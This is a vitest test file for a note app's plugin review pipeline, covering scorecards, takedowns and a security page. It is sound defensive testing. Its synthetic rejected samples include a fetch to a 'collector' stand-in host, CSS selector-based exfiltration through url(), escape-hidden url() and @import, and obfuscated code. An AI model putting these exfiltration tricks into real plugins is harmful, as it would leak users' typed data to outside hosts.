/**
 * Plan W11.S14 — the review of every plugin and theme version, with a
 * scorecard; and W11.S12 — the public security page written from the
 * findings register and those scorecards. The bad samples are synthetic
 * (written here, labelled so); the good ones are the 18 real plugins of
 * public/plugins/examples, reviewed through the real CLI.
 * @vitest-environment node
 */
import { describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import { cpSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CSS_ALLOWED_ORIGINS, TAKEDOWN_MS, cssFindings, decodeCssEscapes, isOpenSourceLicense, overdueTakedowns, reviewPluginVersion, takedowns, type KnownBad, type Scorecard } from "../plugins/runtime/review";
// @ts-expect-error — plain .mjs helpers without types
import { findingsProblems, privacyLabel, renderSecurityPage } from "../../scripts/lib/securityPage.mjs";
// @ts-expect-error — plain .mjs without types
import { inRange } from "../../scripts/audit-lock.mjs";

const REPO = { repository: "https://github.com/example/plugin" };
const manifest = (caps: string[], extra: Record<string, unknown> = REPO) =>
  JSON.stringify({ schema: 1, id: "org.example.test", name: "Test", version: "1.1.0", description: "d", author: "a", license: "MIT", main: "main.js", capabilities: caps.map((id) => ({ id, reason: `needs ${id}` })), ...extra });
const GOOD = `await lumen.commands.register({ id: "x", label: "x" }, async () => { const t = await lumen.document.read(); return t.length; });`;
const rules = (c: Scorecard) => c.findings.filter((f) => f.severity === "error").map((f) => f.rule);

describe("bad samples are all rejected (synthetic)", () => {
  const samples: Array<[string, Parameters<typeof reviewPluginVersion>[0], string]> = [
    ["eval", { manifest: manifest(["commands"]), main: `await lumen.commands.register({ id: "x", label: "x" }, async () => { eval("1+1"); });` }, "eval"],
    ["Function", { manifest: manifest(["commands"]), main: `const f = new Function("return 1"); f();` }, "eval"],
    ["undeclared network call", { manifest: manifest(["commands"]), main: `await lumen.commands.register({ id: "x", label: "x" }, async () => { await lumen.network.fetch("https://collector.example.com/steal"); });` }, "undeclared-network"],
    [
      "string-array obfuscation",
      { manifest: manifest(["commands"]), main: `var _0x4f2a=["log","x","y"];(function(_0x1b3c,_0x2d4e){var _0x5f6a=function(_0x7b8c){return _0x7b8c};_0x5f6a(_0x1b3c)})(_0x4f2a,0x1b);` },
      "obfuscated",
    ],
    ["escape wall", { manifest: manifest(["commands"]), main: `const s = "${"\\x41".repeat(60)}"; void s;` }, "obfuscated"],
    ["minified only", { manifest: manifest(["commands"]), main: `const a=1;${"let b" + "=a+1;".repeat(1)}${Array.from({ length: 400 }, (_, i) => `const v${i}=${i};`).join("")}` }, "minified-only"],
    ["closed source", { manifest: manifest(["document:read", "commands"], {}), main: GOOD }, "closed-source"],
    ["CSS url() to exfiltrate", { manifest: manifest(["document:read", "commands"]), main: GOOD, css: `input[value^="a"] { background: url("https://collector.example.com/?k=a"); }` }, "css-remote-url"],
    ["CSS @import", { manifest: manifest(["document:read", "commands"]), main: GOOD, css: `@import "https://fonts.example.com/x.css";\nbody { color: red }` }, "css-import"],
    ["CSS protocol-relative url()", { manifest: manifest(["document:read", "commands"]), main: GOOD, css: `a { background: url(//collector.example.com/p.png) }` }, "css-remote-url"],
  ];
  it.each(samples)("%s → rejected", async (_name: string, input: Parameters<typeof reviewPluginVersion>[0], rule: string) => {
    const c = await reviewPluginVersion(input);
    expect(c.passed).toBe(false);
    expect(c.grade).toBe("F");
    expect(c.score).toBe(0);
    expect(rules(c)).toContain(rule);
  });
  it("100% of them: none passes", async () => {
    const cards = await Promise.all(samples.map(([, i]) => reviewPluginVersion(i)));
    expect(cards.filter((c) => c.passed)).toEqual([]);
  });
  it("a clean version with a public repository passes", async () => {
    const c = await reviewPluginVersion({ manifest: manifest(["document:read", "commands"]), main: GOOD, css: `.x { background: url("data:image/png;base64,AAAA") } .y { background: url(./icon.png) }` });
    expect(rules(c)).toEqual([]);
    expect(c.passed).toBe(true);
    expect(c.source.repository).toBe("https://github.com/example/plugin");
  });
});

describe("permissions against the previous version, the lockfile, the scorecard", () => {
  it("lists added and removed permissions; an added one is a finding", async () => {
    const c = await reviewPluginVersion({ manifest: manifest(["document:read", "commands", "network:https://api.example.com"]), main: `${GOOD}\nawait lumen.network.fetch("https://api.example.com/x");`, previousManifest: manifest(["document:read", "commands", "notifications"]) });
    expect(c.permissions).toEqual({ declared: ["commands", "document:read", "network:https://api.example.com"], added: ["network:https://api.example.com"], removed: ["notifications"] });
    expect(c.findings).toContainEqual({ rule: "new-permission", severity: "warning", detail: "network:https://api.example.com" });
  });
  it("a lockfile without its audit is \"audit owed\", never a clean pass", async () => {
    const c = await reviewPluginVersion({ manifest: manifest(["document:read", "commands"]), main: GOOD, hasLockfile: true });
    expect(c.audit).toBe("owed");
    expect(c.findings.map((f) => f.rule)).toContain("audit-owed");
  });
  it("the scorecard is JSON with the fields the page reads", async () => {
    const c = await reviewPluginVersion({ manifest: manifest(["document:read", "commands"]), main: GOOD, now: Date.UTC(2026, 10, 15) });
    expect(JSON.parse(JSON.stringify(c))).toMatchObject({ kind: "lumen-plugin-scorecard", v: 1, reviewer: "lumen-review/1", id: "org.example.test", version: "1.1.0", reviewedAt: "2026-11-15T00:00:00.000Z", passed: true });
  });
  it("no remote CSS origin is allowed by default", () => {
    expect(CSS_ALLOWED_ORIGINS).toEqual([]);
    expect(cssFindings("/* url(https://x.example) */ a{}")).toEqual([]);
  });
  it("a failing version still listed 24 hours after its review is an overdue takedown", () => {
    const now = Date.UTC(2026, 10, 15, 12);
    const card = (h: number, passed: boolean) => ({ id: "p", version: `1.0.${h}`, passed, reviewedAt: new Date(now - h * 3600_000).toISOString() }) as Scorecard;
    const cards = [card(25, false), card(23, false), card(30, true)];
    const listed = cards.map((c) => ({ id: c.id, version: c.version }));
    expect(overdueTakedowns(listed, cards, now).map((c) => c.version)).toEqual(["1.0.25"]);
    expect(overdueTakedowns([], cards, now)).toEqual([]);
    expect(TAKEDOWN_MS).toBe(24 * 3600_000);
  });
});

describe("#714's checks, ported onto this design (W10 port, train 6; the samples are synthetic)", () => {
  const knownBad = (JSON.parse(readFileSync("security/known-bad.json", "utf8")) as { entries: Array<KnownBad & { file: string }> }).entries.filter((e) => e.file.endsWith("package-lock.json"));
  const lock = (pkgs: Record<string, string>) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, ...Object.fromEntries(Object.entries(pkgs).map(([n, v]) => [`node_modules/${n}`, { version: v }])) } });
  const base = { manifest: manifest(["document:read", "commands"]), main: GOOD };
  const bad: Array<[string, Parameters<typeof reviewPluginVersion>[0], string]> = [
    ["closed licence", { ...base, manifest: manifest(["document:read", "commands"], { ...REPO, license: "Proprietary" }) }, "closed-source"],
    ["licence expression with a non-open id", { ...base, manifest: manifest(["document:read", "commands"], { ...REPO, license: "MIT AND LicenseRef-Commercial" }) }, "closed-source"],
    ["known-bad dependency (high, security/known-bad.json)", { ...base, lockfile: lock({ nanoid: "3.3.3" }), knownBad, inRange }, "vulnerable-dependency"],
    ["lockfile that is not JSON", { ...base, lockfile: "{nope", knownBad, inRange }, "vulnerable-dependency"],
    ["CSS url() hidden with escapes", { ...base, css: `a { background: u\\72l(ht\\74ps://collect.example/p); }` }, "css-remote-url"],
    ["CSS @import hidden with escapes", { ...base, css: `@\\69mport "https://collect.example/x.css";` }, "css-import"],
    ["CSS image-set() to another origin", { ...base, css: `a { background-image: image-set("https://collect.example/a.png" 1x); }` }, "css-remote-url"],
    ["CSS src() string to another origin", { ...base, css: `@font-face { font-family: x; src("https://collect.example/f.woff2"); }` }, "css-remote-url"],
    // ~250-character lines with no whitespace: under this design's one-long-line and 300-average rules, caught by #714's whitespace share.
    ["minified over many short lines, no source", { ...base, main: Array.from({ length: 24 }, (_, l) => Array.from({ length: 8 }, (_, i) => `function f${l}_${i}(x){return x+${i}}`).join(";")).join("\n") }, "minified-only"],
  ];
  it.each(bad)("%s → rejected", async (_name: string, input: Parameters<typeof reviewPluginVersion>[0], rule: string) => {
    const c = await reviewPluginVersion(input);
    expect(c.passed).toBe(false);
    expect(c.score).toBe(0);
    expect(rules(c)).toContain(rule);
  });
  it("a lower-severity known-bad version is a warning, and npm audit stays owed", async () => {
    const low = [{ name: "left-pad", versions: ["1.0.0"], severity: "moderate", advisories: ["GHSA-test-only"] }];
    const c = await reviewPluginVersion({ ...base, lockfile: lock({ "left-pad": "1.0.0" }), knownBad: low, inRange });
    expect(c.passed).toBe(true);
    expect(c.findings).toContainEqual({ rule: "vulnerable-dependency", severity: "warning", detail: "left-pad@1.0.0 (moderate: GHSA-test-only)" });
    expect(c.audit).toBe("owed");
    // A fixed version of the same package is clean.
    expect((await reviewPluginVersion({ ...base, lockfile: lock({ nanoid: "3.3.16" }), knownBad, inRange })).findings.map((f) => f.rule)).not.toContain("vulnerable-dependency");
  });
  it("licences: open-source SPDX ids and expressions", () => {
    expect(isOpenSourceLicense("MIT")).toBe(true);
    expect(isOpenSourceLicense("(MIT OR Apache-2.0)")).toBe(true);
    expect(isOpenSourceLicense("GPL-2.0-or-later WITH Classpath-exception-2.0")).toBe(true);
    expect(isOpenSourceLicense("Proprietary")).toBe(false);
    expect(isOpenSourceLicense("")).toBe(false);
  });
  it("relative, data: and fragment targets stay allowed once escapes are decoded", () => {
    expect(cssFindings(`@font-face { src: url("fonts/a.woff2") } a { background: image-set("./a.png" 1x) } b { background: url(data:image/png;base64,AAAA) } c { fill: url(#g) }`)).toEqual([]);
    expect(decodeCssEscapes("u\\72l(ht\\74ps:")).toBe("url(https:");
  });
});

describe("the registry: every real plugin version reviewed through the CLI", () => {
  const cli = join(process.cwd(), "scripts/review-plugins.mjs");
  it("the 18 example plugins pass, each in ≤ 10 min, and the committed scorecards are current", () => {
    const r = spawnSync(process.execPath, [cli, "--check"], { encoding: "utf8" });
    expect(r.status, r.stdout + r.stderr).toBe(0);
    const dir = "public/plugins/examples/scorecards";
    const cards = readdirSync(dir).map((n) => JSON.parse(readFileSync(join(dir, n), "utf8")) as Scorecard);
    expect(cards).toHaveLength(18);
    for (const c of cards) {
      expect(c.passed, c.id).toBe(true);
      expect(c.durationMs).toBeLessThan(600_000);
    }
  });
  it("a registry with a bad version fails --check", () => {
    const dir = mkdtempSync(join(tmpdir(), "review-"));
    try {
      cpSync("public/plugins/examples/word-stats", join(dir, "word-stats"), { recursive: true });
      const m = JSON.parse(readFileSync(join(dir, "word-stats/lumen-plugin.json"), "utf8"));
      writeFileSync(join(dir, "word-stats/main.js"), readFileSync(join(dir, "word-stats/main.js"), "utf8") + `\neval("x");\n`);
      writeFileSync(join(dir, "index.json"), JSON.stringify({ plugins: [{ id: m.id, name: m.name, versions: [{ version: m.version, path: "word-stats" }] }] }));
      const write = spawnSync(process.execPath, [cli, "--dir", dir, "--in-repo"], { encoding: "utf8" });
      expect(write.stdout).toContain("FAIL lumen.example.word-stats@1.0.0");
      expect(spawnSync(process.execPath, [cli, "--dir", dir, "--in-repo", "--check"], { encoding: "utf8" }).status).toBe(1);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("W11.S14: a failing version is taken down, as code", () => {
  const cli = join(process.cwd(), "scripts/review-plugins.mjs");
  it("takedowns(): every listed version whose review failed, and none already delisted", () => {
    const card = (v: string, passed: boolean) => ({ id: "p", version: v, passed, reviewedAt: "2026-11-15T00:00:00.000Z" }) as Scorecard;
    const cards = [card("1.0.0", false), card("1.1.0", true), card("1.2.0", false)];
    expect(takedowns([{ id: "p", version: "1.0.0" }, { id: "p", version: "1.1.0" }, { id: "p", version: "1.2.0" }], cards).map((c) => c.version)).toEqual(["1.0.0", "1.2.0"]);
    expect(takedowns([{ id: "p", version: "1.1.0" }], cards)).toEqual([]);
  });

  it("--takedown delists the failing version in index.json with its rules; the passing one stays; the 24 h clock stops", () => {
    const dir = mkdtempSync(join(tmpdir(), "takedown-"));
    try {
      for (const name of ["word-stats", "toc"]) cpSync(`public/plugins/examples/${name}`, join(dir, name), { recursive: true });
      writeFileSync(join(dir, "word-stats/main.js"), readFileSync(join(dir, "word-stats/main.js"), "utf8") + `\neval("x");\n`);
      const entry = (name: string) => {
        const m = JSON.parse(readFileSync(join(dir, name, "lumen-plugin.json"), "utf8"));
        return { id: m.id, name: m.name, versions: [{ version: m.version, path: name }] };
      };
      writeFileSync(join(dir, "index.json"), JSON.stringify({ plugins: [entry("word-stats"), entry("toc")] }));
      const run = (...a: string[]) => spawnSync(process.execPath, [cli, "--dir", dir, "--in-repo", ...a], { encoding: "utf8" });
      run(); // the reviews on record
      // The failed review is 25 h old: overdue while it is still listed.
      const cardFile = join(dir, "scorecards/lumen.example.word-stats@1.0.0.json");
      const card = JSON.parse(readFileSync(cardFile, "utf8")) as Scorecard;
      writeFileSync(cardFile, JSON.stringify({ ...card, reviewedAt: new Date(Date.now() - TAKEDOWN_MS - 3600_000).toISOString() }, null, 2) + "\n");
      expect(run("--check").stdout).toContain("overdue takedown");

      const t = run("--takedown");
      expect(t.status, t.stdout + t.stderr).toBe(0);
      expect(t.stdout).toContain("taken down: lumen.example.word-stats@1.0.0");
      const index = JSON.parse(readFileSync(join(dir, "index.json"), "utf8"));
      const ws = index.plugins.find((p: { id: string }) => p.id === "lumen.example.word-stats").versions[0];
      expect(ws.delisted.rules).toEqual([...new Set(rules(card))]);
      expect(ws.delisted.rules.length).toBeGreaterThan(0);
      expect(Date.parse(ws.delisted.at)).toBeGreaterThan(Date.now() - 60_000);
      expect(index.plugins.find((p: { id: string }) => p.id !== "lumen.example.word-stats").versions[0].delisted).toBeUndefined();
      // Review 11, M5: the takedown raises the serial (the app refuses the older index once it saw this one).
      expect(index.serial).toBe(1);
      // No longer listed: not overdue. The failing version itself still fails the check until its folder goes.
      const after = run("--check");
      expect(after.stdout).not.toContain("overdue takedown");
      expect(after.status).toBe(1);
      expect(run("--takedown").stdout).toContain("nothing to take down");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("the app neither lists nor installs a delisted version", () => {
    const gallery = readFileSync("src/plugins/runtime/SandboxedPlugins.tsx", "utf8");
    expect(gallery).toMatch(/p\.versions\.filter\(\(v\) => !v\.delisted\)/);
    const builder = readFileSync("scripts/build-plugin-registry.mjs", "utf8");
    expect(builder).toMatch(/delisted\(v\) \? \{ delisted: delisted\(v\) \}/);
  });
});

describe("the security page (W11.S12)", () => {
  const findings = JSON.parse(readFileSync("security/findings.json", "utf8"));
  const cards = readdirSync("public/plugins/examples/scorecards").map((n) => JSON.parse(readFileSync(join("public/plugins/examples/scorecards", n), "utf8")));

  it("the register is valid, and says there is no external audit", () => {
    expect(findingsProblems(findings)).toEqual([]);
    expect(findings.audit.external).toBe(false);
  });
  it("both pages are current (npm run security:page -- --check)", () => {
    const r = spawnSync(process.execPath, ["scripts/security-page.mjs", "--check"], { encoding: "utf8" });
    expect(r.status, r.stderr).toBe(0);
  });
  it.each([["en"], ["he"]] as [string][])("%s: every open finding in the register is on the page, and a fixed one is not", (lang: string) => {
    const withNew = { ...findings, findings: [...findings.findings, { id: "LUM-2026-999", status: "open", severity: "high", area: "test", opened: "2026-11-15", en: "A planted open finding", he: "ממצא פתוח שתול" }, { id: "LUM-2026-998", status: "fixed", fixedBy: "#1", severity: "low", area: "test", opened: "2026-11-01", en: "A fixed one", he: "אחד שתוקן" }] };
    const page = renderSecurityPage(withNew, cards, lang);
    for (const f of withNew.findings.filter((x: { status: string }) => x.status !== "fixed")) expect(page, f.id).toContain(`| ${f.id} |`);
    expect(page).toContain(lang === "en" ? "A planted open finding" : "ממצא פתוח שתול");
    expect(page).not.toContain("LUM-2026-998");
    const committed = readFileSync(lang === "en" ? "docs/src/content/docs/security/index.md" : "docs/src/content/docs/he/security/index.md", "utf8");
    for (const f of findings.findings.filter((x: { status: string }) => x.status !== "fixed")) expect(committed, f.id).toContain(`| ${f.id} |`);
  });
  it("every listed plugin has its scorecard grade and a privacy label from its permissions", () => {
    const page = renderSecurityPage(findings, cards, "en");
    for (const c of cards) expect(page).toContain(`| \`${c.id}\` | ${c.version} | ${c.grade} | ${c.score} |`);
    expect(privacyLabel(["document:read", "network:https://api.example.com"], "en")).toEqual(["Reads the open note", "Can send data to https://api.example.com"]);
    expect(privacyLabel(["document:read"], "he")).toEqual(["קורא את הפתק הפתוח", "לא אוסף כלום: בלי גישה לרשת"]);
  });
  it("an \"audited\" claim needs a published report", () => {
    expect(findingsProblems({ ...findings, audit: { ...findings.audit, external: true } })).toContain("audit: an external audit needs the published report (https link)");
  });
});
